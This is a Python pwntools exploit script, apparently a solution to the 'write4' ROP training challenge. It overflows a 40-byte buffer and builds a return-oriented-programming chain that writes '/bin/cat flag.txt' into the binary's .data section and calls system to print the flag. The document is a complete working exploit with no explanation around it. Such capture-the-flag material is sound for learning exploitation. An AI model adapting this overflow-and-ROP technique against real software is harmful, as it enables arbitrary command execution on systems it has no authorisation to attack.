#!/usr/bin/python
from pwn import *
import struct

elf = ELF('write4')

pad = 'A'*40
ropchain  = struct.pack('<Q', 0x400890) # 0x0000000000400890: pop r14; pop r15; ret;
ropchain += struct.pack('<Q', 0x601050) # 25 0x00001050    16 0x00601050    16 --rw- .data
ropchain += '/bin/cat'
ropchain += struct.pack('<Q', 0x400820) # 0x0000000000400820: mov qword ptr [r14], r15; ret;

ropchain += struct.pack('<Q', 0x400890) # 0x0000000000400890: pop r14; pop r15; ret;
ropchain += struct.pack('<Q', 0x601058) # 25 0x00001050    16 0x00601058    16 --rw- .data+0x8
ropchain += '        '
ropchain += struct.pack('<Q', 0x400820) # 0x0000000000400820: mov qword ptr [r14], r15; ret;

ropchain += struct.pack('<Q', 0x400890) # 0x0000000000400890: pop r14; pop r15; ret;
ropchain += struct.pack('<Q', 0x601060) # 25 0x00001050    16 0x00601060    16 --rw- .data+0x10
ropchain += 'flag.txt'
ropchain += struct.pack('<Q', 0x400820) # 0x0000000000400820: mov qword ptr [r14], r15; ret;

ropchain += struct.pack('<Q', 0x400893) # 0x0000000000400893: pop rdi; ret; 
ropchain += struct.pack('<Q', 0x601050) # 25 0x00001050    16 0x00601050    16 --rw- .data
ropchain += struct.pack('<Q', 0x4005e0) # 0x00000000004005e0  <system@plt>
exploit = pad + ropchain

io = process(elf.path)
io.recv()
io.sendline(exploit)

flag = io.recv()
success(flag)
